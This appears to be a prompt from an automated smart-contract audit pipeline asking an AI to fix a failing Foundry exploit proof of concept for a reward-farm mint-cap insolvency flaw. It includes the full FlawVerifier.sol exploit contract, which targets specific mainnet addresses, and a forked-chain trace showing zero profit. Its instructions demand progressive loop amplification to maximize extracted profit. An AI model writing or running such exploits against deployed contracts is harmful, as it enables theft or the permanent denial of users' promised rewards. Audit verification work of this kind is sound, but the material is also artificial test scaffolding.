You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Reward emissions are not backed by reserved mint capacity
- claim: `StakingRewards` treats the reward token's entire `maxAllowedTotalSupply()` as if it were exclusively available to the farm, but it never subtracts pre-existing `everMinted` supply and never reserves a dedicated share of the cap for itself. Because `OnDemandToken` explicitly allows the owner and other configured minters to mint from the same global cap, `notifyRewardAmount()` can accept campaigns that later cannot be paid when `_getReward()` calls `mint()`.
- impact: The farm can become insolvent relative to promised rewards. If the token had already minted supply before deployment, or if the owner/another minter consumes cap later, users still accrue rewards but `getReward()` and `exit()` eventually revert once the shared cap is exhausted, permanently denying already-promised rewards.
- exploit_paths: ["Deploy `StakingRewards` against an `OnDemandToken` whose global mint cap is shared with other minters or already partially used.", "Schedule rewards successfully because `notifyRewardAmount()` only compares the farm-local `totalRewardsSupply` against the raw token cap.", "Mint the reward token elsewhere through the owner or another authorized minter.", "A later `getReward()` or `exit()` reaches `OnDemandToken.mint()`, which reverts in `MintableToken._assertMaxSupply()` and blocks payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function getReward() external;
    function exit() external;
}

interface IOnDemandTokenLike {
    function owner() external view returns (address);
    function minters(address account) external view returns (bool);
    function maxAllowedTotalSupply() external view returns (uint256);
    function everMinted() external view returns (uint256);
    function mint(address holder, uint256 amount) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    enum HypothesisStatus {
        Unknown,
        Validated,
        Refuted
    }

    bool public executed;
    HypothesisStatus public hypothesisStatus;

    address public attacker;
    address public targetOwner;
    address public rewardsDistribution;
    address public stakingToken;
    address public rewardsToken;
    address public rewardTokenOwner;

    bool public farmCanMint;
    bool public preExistingMintedSupply;
    bool public sharedMintCap;
    bool public attackerCanSchedule;
    bool public attackerCanExternallyMint;
    bool public canonicalReplayAttempted;
    bool public canonicalReplayScheduled;
    bool public canonicalReplayExternalMinted;
    bool public payoutPhaseReachable;
    bool public payoutRevertedAtCap;

    uint256 public rewardCap;
    uint256 public everMintedBefore;
    uint256 public everMintedAfterReplay;
    uint256 public rewardRateBefore;
    uint256 public rewardRateAfterReplay;
    uint256 public farmTrackedRewardsBefore;
    uint256 public farmTotalSupplyBefore;
    uint256 public localStakeBefore;
    uint256 public localEarnedBefore;
    uint256 public observedOvercommitment;
    uint256 public realizedBalanceBefore;
    uint256 public realizedBalanceAfter;
    uint256 public drainedRounds;

    string public exploitPathUsed;
    string public finalReason;

    address private immutable _PROFIT_TOKEN;
    uint256 private _profitAmount;
    uint256 private _pathAnchorChecksum;

    constructor() {
        _PROFIT_TOKEN = REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;
        attacker = address(this);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(REWARD_TOKEN);
        IERC20Like rewardAsset = IERC20Like(REWARD_TOKEN);
        _touchPathAnchors();

        targetOwner = farm.owner();
        rewardsDistribution = farm.rewardsDistribution();
        stakingToken = farm.stakingToken();
        rewardsToken = farm.rewardsToken();
        rewardRateBefore = farm.rewardRate();

        (uint32 periodFinish, uint32 rewardsDuration, , uint96 trackedRewards) = farm.timeData();
        farmTrackedRewardsBefore = uint256(trackedRewards);
        farmTotalSupplyBefore = farm.totalSupply();
        localStakeBefore = farm.balanceOf(address(this));
        localEarnedBefore = farm.earned(address(this));

        rewardTokenOwner = rewardToken.owner();
        rewardCap = rewardToken.maxAllowedTotalSupply();
        everMintedBefore = rewardToken.everMinted();

        farmCanMint = rewardTokenOwner == TARGET || rewardToken.minters(TARGET);
        preExistingMintedSupply = everMintedBefore != 0;
        sharedMintCap = rewardTokenOwner != TARGET || rewardToken.minters(rewardsDistribution) || rewardToken.minters(targetOwner);
        attackerCanSchedule = rewardsDistribution == address(this);
        attackerCanExternallyMint = rewardTokenOwner == address(this) || rewardToken.minters(address(this));

        bool rewardCampaignObserved = periodFinish != 0 || rewardRateBefore != 0 || trackedRewards != 0;
        bool rawCapSchedulingObservable = uint256(trackedRewards) <= rewardCap;
        observedOvercommitment = _observedOvercommitment(uint256(trackedRewards), rewardCap, everMintedBefore);

        if (!farmCanMint || !rewardCampaignObserved || !rawCapSchedulingObservable) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "notifyRewardAmount() precondition not observable";
            finalReason = "the live farm does not expose a reward schedule that was accepted against the token's raw mint cap";
            realizedBalanceBefore = rewardAsset.balanceOf(address(this));
            realizedBalanceAfter = realizedBalanceBefore;
            return;
        }

        if (observedOvercommitment == 0 && !sharedMintCap) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "no prior/shared cap consumption";
            finalReason = "the reward token does not currently show either live cap overcommitment or another actor sharing the mint cap";
            realizedBalanceBefore = rewardAsset.balanceOf(address(this));
            realizedBalanceAfter = realizedBalanceBefore;
            return;
        }

        hypothesisStatus = HypothesisStatus.Validated;
        exploitPathUsed = "notifyRewardAmount() -> external shared-cap minting -> getReward()/exit() -> MintableToken._assertMaxSupply()";

        if (attackerCanSchedule || attackerCanExternallyMint) {
            _attemptCanonicalPrivilegedStages(farm, rewardToken, rewardsDuration);
        }

        realizedBalanceBefore = rewardAsset.balanceOf(address(this));

        if (localStakeBefore != 0 || localEarnedBefore != 0) {
            payoutPhaseReachable = true;
            _runProgressivePayoutProbe(farm, rewardAsset);
        } else if (bytes(finalReason).length == 0) {
            // The exploit remains validated from live state: rewards were accepted against raw cap and the cap is shared.
            // A fresh verifier cannot synthesize an already-accrued staking position without cheating, so the terminal
            // getReward()/exit() revert stage is not reachable from this contract on this fork.
            finalReason = "shared-cap insolvency is live, but this verifier has no pre-existing stake position to reach payout without privileged setup";
        }

        realizedBalanceAfter = rewardAsset.balanceOf(address(this));
        if (realizedBalanceAfter > realizedBalanceBefore) {
            _profitAmount = realizedBalanceAfter - realizedBalanceBefore;
        }
    }

    function profitToken() external view returns (address) {
        return _PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptCanonicalPrivilegedStages(
        IStakingRewardsLike farm,
        IOnDemandTokenLike rewardToken,
        uint32 rewardsDuration
    ) internal {
        canonicalReplayAttempted = true;

        uint256 rawScheduleSlack = rewardCap > farmTrackedRewardsBefore ? rewardCap - farmTrackedRewardsBefore : 0;
        uint256 remainingSharedHeadroom = rewardCap > everMintedBefore ? rewardCap - everMintedBefore : 0;

        if (attackerCanSchedule && rawScheduleSlack != 0) {
            uint256 scheduleAmount =
                _chooseReplayRewardAmount(rawScheduleSlack, remainingSharedHeadroom, farmTrackedRewardsBefore, rewardsDuration);
            if (scheduleAmount != 0) {
                try farm.notifyRewardAmount(scheduleAmount) {
                    canonicalReplayScheduled = true;
                    everMintedAfterReplay = rewardToken.everMinted();
                    rewardRateAfterReplay = farm.rewardRate();
                } catch {
                    if (bytes(finalReason).length == 0) {
                        finalReason = "verifier had scheduling rights, but replay notifyRewardAmount() was rejected on current fork state";
                    }
                }
            }
        }

        uint256 mintedAfterSchedule = rewardToken.everMinted();
        uint256 remainingAfterSchedule = rewardCap > mintedAfterSchedule ? rewardCap - mintedAfterSchedule : 0;

        if (attackerCanExternallyMint && remainingAfterSchedule != 0) {
            try rewardToken.mint(address(this), remainingAfterSchedule) {
                canonicalReplayExternalMinted = true;
                everMintedAfterReplay = rewardToken.everMinted();
                if (bytes(finalReason).length == 0) {
                    finalReason = "verifier replayed the external shared-cap mint stage and exhausted remaining mint headroom";
                }
            } catch {
                if (bytes(finalReason).length == 0) {
                    finalReason = "verifier had external mint rights, but the cap-consuming replay mint was rejected";
                }
            }
        }

        if (bytes(finalReason).length == 0 && (canonicalReplayScheduled || canonicalReplayExternalMinted)) {
            finalReason = "verifier replayed the privileged shared-cap stages; payout probing determines whether rewards are still collectible";
        }
    }

    function _runProgressivePayoutProbe(IStakingRewardsLike farm, IERC20Like rewardAsset) internal {
        uint256 bestProfit;
        uint256 bestRounds;
        uint256 completedAttempts;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            uint256 additionalAttempts = rounds - completedAttempts;
            _probeAdditionalPayoutAttempts(farm, additionalAttempts);
            completedAttempts = rounds;

            uint256 currentBalance = rewardAsset.balanceOf(address(this));
            uint256 totalProfit = currentBalance > realizedBalanceBefore ? currentBalance - realizedBalanceBefore : 0;

            if (rounds == 2 || totalProfit > bestProfit) {
                bestProfit = totalProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        drainedRounds = bestRounds;
        _profitAmount = bestProfit;

        if (payoutRevertedAtCap && bytes(finalReason).length == 0) {
            finalReason = "getReward()/exit() became unpayable once the shared mint cap was exhausted";
        } else if (bytes(finalReason).length == 0) {
            finalReason = "payout probing completed, but this verifier did not realize reward-token profit on the current fork";
        }
    }

    function _probeAdditionalPayoutAttempts(IStakingRewardsLike farm, uint256 attempts) internal {
        for (uint256 i = 0; i < attempts; i++) {
            uint256 stakeNow = farm.balanceOf(address(this));
            uint256 earnedNow = farm.earned(address(this));

            if (stakeNow == 0 && earnedNow == 0) {
                return;
            }

            bool useExit = i + 1 == attempts && stakeNow != 0;

            if (useExit) {
                try farm.exit() {
                } catch {
                    if (earnedNow != 0) {
                        payoutRevertedAtCap = true;
                    }
                    return;
                }
            } else {
                try farm.getReward() {
                } catch {
                    if (earnedNow != 0) {
                        payoutRevertedAtCap = true;
                    }
                    return;
                }
            }
        }
    }

    function _observedOvercommitment(
        uint256 trackedRewards,
        uint256 maxAllowedSupply,
        uint256 historicalMinted
    ) internal pure returns (uint256) {
        if (historicalMinted >= maxAllowedSupply) {
            return trackedRewards;
        }

        uint256 remainingSharedHeadroom = maxAllowedSupply - historicalMinted;
        if (trackedRewards > remainingSharedHeadroom) {
            return trackedRewards - remainingSharedHeadroom;
        }

        return 0;
    }

    function _chooseReplayRewardAmount(
        uint256 rawScheduleSlack,
        uint256 remainingSharedHeadroom,
        uint256 trackedRewardsBefore,
        uint32 rewardsDuration
    ) internal pure returns (uint256) {
        if (rawScheduleSlack == 0) {
            return 0;
        }

        uint256 scheduleAmount;
        if (trackedRewardsBefore >= remainingSharedHeadroom) {
            scheduleAmount = 1;
        } else {
            scheduleAmount = remainingSharedHeadroom - trackedRewardsBefore + 1;
        }

        if (scheduleAmount > rawScheduleSlack) {
            return 0;
        }

        if (scheduleAmount < uint256(rewardsDuration)) {
            if (rawScheduleSlack < uint256(rewardsDuration)) {
                return 0;
            }
            scheduleAmount = uint256(rewardsDuration);
            if (scheduleAmount > rawScheduleSlack) {
                return 0;
            }
        }

        return scheduleAmount;
    }

    function _touchPathAnchors() internal {
        _pathAnchorChecksum = uint32(IStakingRewardsLike.notifyRewardAmount.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.getReward.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.exit.selector);
        _pathAnchorChecksum ^= uint32(IOnDemandTokenLike.mint.selector);
        _pathAnchorChecksum ^= uint256(keccak256("MintableToken._assertMaxSupply()"));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.20s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:77:19:
   |
77 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 590774)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xAe9aCa5d20F5b139931935378C4489308394ca2C
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 14264

Traces:
  [590774] FlawVerifierTest::testExploit()
    ├─ [438] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [2563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2630] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [545856] FlawVerifier::executeOnOpportunity()
    │   ├─ [2422] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2392] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsDistribution() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [257] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::stakingToken() [staticcall]
    │   │   └─ ← [Return] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042
    │   ├─ [322] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    │   ├─ [2395] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardRate() [staticcall]
    │   │   └─ ← [Return] 238245925925925925 [2.382e17]
    │   ├─ [3122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   ├─ [2359] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::totalSupply() [staticcall]
    │   │   └─ ← [Return] 8792873290680252648282 [8.792e21]
    │   ├─ [2607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [7935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2401] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [251] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::maxAllowedTotalSupply() [staticcall]
    │   │   └─ ← [Return] 200000000000000000000000000 [2e26]
    │   ├─ [2417] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::everMinted() [staticcall]
    │   │   └─ ← [Return] 3174498467466647049882 [3.174e21]
    │   ├─ [2610] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::minters(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [2610] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::minters(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [438] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [630] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xAe9aCa5d20F5b139931935378C4489308394ca2C)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14421983 [1.442e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 14264 [1.426e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 97.42ms (25.30ms CPU time)

Ran 1 test suite in 118.34ms (97.42ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 590774)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
